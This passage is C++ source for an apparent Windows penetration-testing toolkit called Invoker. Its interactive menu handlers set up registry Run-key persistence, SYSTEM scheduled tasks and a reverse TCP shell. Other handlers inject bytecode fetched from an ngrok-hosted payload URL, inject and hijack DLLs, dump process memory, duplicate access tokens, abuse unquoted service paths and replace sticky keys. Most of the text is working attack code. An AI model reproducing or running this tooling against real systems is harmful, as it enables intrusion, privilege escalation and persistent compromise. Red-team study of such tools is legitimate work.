	output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                      #");
	output("# Subkey : Software\\Microsoft\\Windows\\CurrentVersion\\Run               #");
	output("# Name   : PowerShell                                                  #");
	output("# Data   : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   #");
	output("#----------------------------------------------------------------------#");
	output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                      #");
	output("# Subkey : Software\\Policies\\Microsoft\\Windows\\Installer               #");
	output("# Name   : AlwaysInstallElevated                                       #");
	output("# Data   : 1                                                           #");
	output("################################# NOTE #################################");
	output("# In the second example, use an MSI payload.                           #");
	output("########################################################################");
	output("");
	output("############################ REGISTRY HIVES ############################");
	output("# [1] HKEY_CLASSES_ROOT                                                #");
	output("# [2] HKEY_CURRENT_USER                                                #");
	output("# [3] HKEY_LOCAL_MACHINE                                               #");
	output("# [4] HKEY_USERS                                                       #");
	output("# [5] HKEY_CURRENT_CONFIG                                              #");
	output("########################################################################");
	std::string choice = input("Choose registry hive");
	output("");
	HKEY hKey = NULL;
	if (choice == "1") {
		hKey = HKEY_CLASSES_ROOT;
	}
	else if (choice == "2") {
		hKey = HKEY_CURRENT_USER;
	}
	else if (choice == "3") {
		hKey = HKEY_LOCAL_MACHINE;
	}
	else if (choice == "4") {
		hKey = HKEY_USERS;
	}
	else if (choice == "5") {
		hKey = HKEY_CURRENT_CONFIG;
	}
	else {
		output("Invalid choice");
	}
	if (hKey != NULL) {
		std::string subkey = input("Enter subkey");
		output("");
		std::string name = input("Enter value name");
		output("");
		std::string data = input("Enter value data");
		output("");
		std::string confirm = input("Confirm (yes)");
		if (strToLower(confirm) == "yes") {
			output("");
			editRegKey(&hKey, subkey, name, data);
		}
	}
}

void cppScheduleTask() {
	output("############################### EXAMPLES ###############################");
	output("# Name : CMD                                                           #");
	output("# User : Kira                                                          #");
	output("# File : C:\\Windows\\System32\\cmd.exe                                   #");
	output("# Args : /K WHOAMI /PRIV                                               #");
	output("#----------------------------------------------------------------------#");
	output("# Name : PowerShell                                                    #");
	output("# User : NT AUTHORITY\\SYSTEM                                           #");
	output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe     #");
	output("################################# NOTE #################################");
	output("# Task will trigger only once, after exactly one minute.               #");
	output("########################################################################");
	output("");
	std::string name = input("Enter task name");
	output("");
	std::string user = input("Enter user name");
	output("");
	std::string file = input("Enter file name");
	output("");
	std::string args = input("Enter file arguments (optional)");
	output("");
	if (name.length() < 1 || user.length() < 1 || file.length() < 1) {
		output("Required parameters are missing");
	}
	else {
		scheduleTask(name, user, file, args);
	}
}

void cppReverseTcp() {
	output("############################### EXAMPLES ###############################");
	output("# IP   : 192.168.8.185                                                 #");
	output("# Port : 9000                                                          #");
	output("########################################################################");
	output("");
	std::string ip = input("Enter IP address");
	output("");
	std::string port = input("Enter port number");
	output("");
	if (ip.length() < 1 || port.length() < 1) {
		output("Both parameters are required");
	}
	else if (!isPositiveNumber(port)) {
		output("Port number must be a positive number");
	}
	else {
		reverseTcp(ip, atoi(port.c_str()));
	}
}

void cppTerminateProcess() {
	int pid = getProcessId();
	if (pid != -1) {
		terminateProcess(pid);
	}
}

void cppRunProcess() {
	output("############################### EXAMPLES ###############################");
	output("# File : C:\\Windows\\System32\\cmd.exe                                   #");
	output("# Args : /K WHOAMI /PRIV                                               #");
	output("#----------------------------------------------------------------------#");
	output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe     #");
	output("################################# NOTE #################################");
	output("# Process will run in a new window.                                    #");
	output("########################################################################");
	output("");
	std::string file = input("Enter file name");
	output("");
	std::string args = input("Enter file arguments (optional)");
	output("");
	if (file.length() < 1) {
		output("File name is rquired");
	}
	else {
		runProcess(file, args);
	}
}

void cppDumpProcessMemory() {
	int pid = getProcessId();
	if (pid != -1) {
		dumpFullProcMemory(pid);
	}
}

void cppInjectBytcodeWeb() {
	output("############################### EXAMPLES ###############################");
	output("# URL     : 08ab992ff989.ngrok.io/payload.txt                          #");
	output("# Port    : 80                                                         #");
	output("# Element : <invoker>payload</invoker>                                 #");
	output("################################# NOTE #################################");
	output("# By default an HTTP GET request will be sent.                         #");
	output("# This method does not yet support HTTPS.                              #");
	output("#----------------------------------------------------------------------#");
	output("# Custom element must be unique within the web content.                #");
	output("# Payload must be enclosed from both front and back.                   #");
	output("########################################################################");
	output("");
	std::string url = input("Enter URL");
	output("");
	std::string port = input("Enter port number");
	output("");
	std::string element = input("Enter custom element");
	output("");
	if (url.length() < 1 || port.length() < 1 || element.length() < 1) {
		output("All parameters are required");
	}
	else if (!isPositiveNumber(port)) {
		output("Port number must be a positive number");
	}
	else {
		std::string data = getWebContent(url, atoi(port.c_str()));
		if (data.length() > 0) {
			const std::string placeholder = "payload";
			std::string payload = extractPayload(data, element, placeholder);
			if (payload.length() > 0) {
				output("");
				int pid = getProcessId();
				if (pid != -1) {
					// NOTE: Change or omit the payload decoder here.
					payload = base64_decode(payload);
					injectBytecode(pid, payload);
				}
			}
		}
	}
}

void cppInjectBytcodeFile() {
	output("############################### EXAMPLES ###############################");
	output("# File : C:\\Users\\Kira\\Downloads\\payload.bin                           #");
	output("################################# NOTE #################################");
	output("# Bytecode will run in a new thread.                                   #");
	output("########################################################################");
	output("");
	std::string file = input("Enter file name");
	output("");
	if (file.length() < 1) {
		output("File name is required");
	}
	else {
		std::string payload = readFile(file);
		if (payload.length() > 0) {
			int pid = getProcessId();
			if (pid != -1) {
				injectBytecode(pid, payload);
			}
		}
	}
}

void cppInjectDll() {
	output("############################### EXAMPLES ###############################");
	output("# File : C:\\Users\\Kira\\Downloads\\payload.dll                           #");
	output("################################# NOTE #################################");
	output("# DLL will run in a new thread.                                        #");
	output("########################################################################");
	output("");
	std::string file = input("Enter file name");
	output("");
	if (file.length() < 1) {
		output("File name is required");
	}
	else {
		int pid = getProcessId();
		if (pid != -1) {
			injectDll(pid, file);
		}
	}
}

void cppDllHijacking() {
	int pid = getProcessId();
	if (pid != -1) {
		listProcessDlls(pid);
		output("");
		output("################################# NOTE #################################");
		output("# This method will not list missing DLLs, only loaded ones.            #");
		output("#----------------------------------------------------------------------#");
		output("# Rename your \"payload.dll\" to any of the listed DLLs and replace it.  #");
		output("# Some directories will require a write permission.                    #");
		output("# Restart the process if needed.                                       #");
		output("# Some processes may crash or work partially afterwards.               #");
		output("########################################################################");
	}
}

// NOTE: Structure is defined in ".\lib\invoker.h".
hook info = { "", NULL, false };

void cppInstallWindowsHook() {
	if (!info.active) {
		output("############################### EXAMPLES ###############################");
		output("# File : C:\\Users\\Kira\\Downloads\\InvokerHook_x64.dll                   #");
		output("################################# NOTE #################################");
		output("# Only one hook can be active at the time.                             #");
		output("########################################################################");
		std::string file = input("Enter file name");
		output("");
		if (file.length() < 1) {
			output("File name is rquired");
		}
		else {
			info.file = file;
			info.hThread = createHookThread(&info);
		}
	}
	else {
		std::string confirm = input("Uninstall hook procedure (yes)");
		if (strToLower(confirm) == "yes") {
			info.active = false;
			WaitForSingleObject(info.hThread, INFINITE);
			CloseHandle(info.hThread);
		}
	}
}

void cppEnableAccessTokenPrivs() {
	enableAccessTokenPrivs();
}

void cppDuplicateAccessToken() {
	output("############################### EXAMPLES ###############################");
	output("# File : C:\\Windows\\System32\\cmd.exe                                   #");
	output("# Args : /K WHOAMI /PRIV                                               #");
	output("# PID  : 3301                                                          #");
	output("#----------------------------------------------------------------------#");
	output("# File : C:\\Users\\Kira\\Downloads\\Invoker_x64.exe                       #");
	output("# PID  : 3301                                                          #");
	output("################################# NOTE #################################");
	output("# Process will run in a new window.                                    #");
	output("########################################################################");
	output("");
	std::string file = input("Enter file name");
	output("");
	std::string args = input("Enter file arguments (optional)");
	output("");
	if (file.length() < 1) {
		output("File name is rquired");
	}
	else {
		int pid = getProcessId();
		if (pid != -1) {
			HANDLE hToken = duplicateAccessToken(pid);
			if (hToken != NULL) {
				output("");
				runProcess(file, args, &hToken);
				CloseHandle(hToken);
			}
		}
	}
}

void cppUnquotedServicePaths() {
	std::string name = getUnquotedServiceName();
	if (name.length() > 0) {
		output("[1] Start   ");
		output("[2] Stop    ");
		output("[3] Restart ");
		output("------------");
		std::string choice = input("Your choice");
		output("");
		if (choice == "1") {
			manageService(name, 1);
		}
		else if (choice == "2") {
			manageService(name, 2);
		}
		else if (choice == "3") {
			manageService(name, 3);
		}
		else {
			output("Invalid choice");
		}
	}
}

void cppReplaceStickyKeys() {
	replaceStickyKeys();
}

// -----------------------------------------------------

int main() {
	SetConsoleTitle("Invoker");
	std::string choice = "0";
	do {
		output("########################################################################");
		output("#                                                                      #");
		output("#                             Invoker v3.1.1                           #");
		output("#                                     by Ivan Sincek                   #");
		output("#                                                                      #");
		output("# Penetration testing utility.                                         #");
		output("# GitHub repository at github.com/ivan-sincek/invoker.                 #");
		output("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #");
		output("#                                                                      #");
		output("########################################################################");
		output("# [ 0]            Exit                                                 #");
		output("########################################################################");
		output("# [ 1] [SYSTEM]   Invoke CMD                                           #");
		output("# [ 2] [SYSTEM]   Invoke PS                                            #");
		output("#----------------------------------------------------------------------#");
		output("# [ 3] [MS WORD]  Invoke CMD & PS                                      #");
		output("#----------------------------------------------------------------------#");
		output("# [ 4] [PS]       Reverse TCP                                          #");
		output("#----------------------------------------------------------------------#");
		output("# [ 5] [C++]      Download File                                        #");
		output("# [ 6] [C++]      Add/Edit Registry Key                                #");
		output("# [ 7] [C++]      Schedule Task                                        #");
		output("# [ 8] [C++]      Reverse TCP                                          #");
		output("# [ 9] [C++]      Terminate Process                                    #");
		output("# [10] [C++]      Run Process                                          #");
		output("# [11] [C++]      Dump Process Memory                                  #");
		output("# [12] [C++]      Inject Bytecode From Web                             #");
		output("# [13] [C++]      Inject Bytecode From File                            #");
		output("# [14] [C++]      Inject DLL                                           #");
		output("# [15] [C++]      DLL Hijacking                                        #");
		output("# [16] [C++]      Install Windows Hook From DLL                        #");
		output("# [17] [C++]      Enable Access Token Privileges                       #");
		output("# [18] [C++]      Duplicate Access Token                               #");
		output("# [19] [C++]      Unquoted Service Paths                               #");
		output("# [20] [C++]      Replace Sticky Keys                                  #");
		output("########################################################################");
		choice = input("Your choice");
		if (isPositiveNumber(choice)) {
			int ch = atoi(choice.c_str());
			if (ch >= 1 && ch <= 20) {
				clear();
				switch (ch) {
					case  1: { systemInvokeCmd();           break; }
					case  2: { systemInvokePs();            break; }
					case  3: { msInvokeBoth();              break; }
					case  4: { psReverseTcp();              break; }
					case  5: { cppDownloadFile();           break; }
					case  6: { cppAddEditRegKey();          break; }
					case  7: { cppScheduleTask();           break; }
					case  8: { cppReverseTcp();             break; }
					case  9: { cppTerminateProcess();       break; }
					case 10: { cppRunProcess();             break; }
					case 11: { cppDumpProcessMemory();      break; }
					case 12: { cppInjectBytcodeWeb();       break; }
					case 13: { cppInjectBytcodeFile();      break; }
					case 14: { cppInjectDll();              break; }
					case 15: { cppDllHijacking();           break; }
					case 16: { cppInstallWindowsHook();     break; }
					case 17: { cppEnableAccessTokenPrivs(); break; }
					case 18: { cppDuplicateAccessToken();   break; }
					case 19: { cppUnquotedServicePaths();   break; }
					case 20: { cppReplaceStickyKeys();      break; }
				}
				pause();
				clear();
			}
		}
	} while (choice != "0");
	return 0;
}

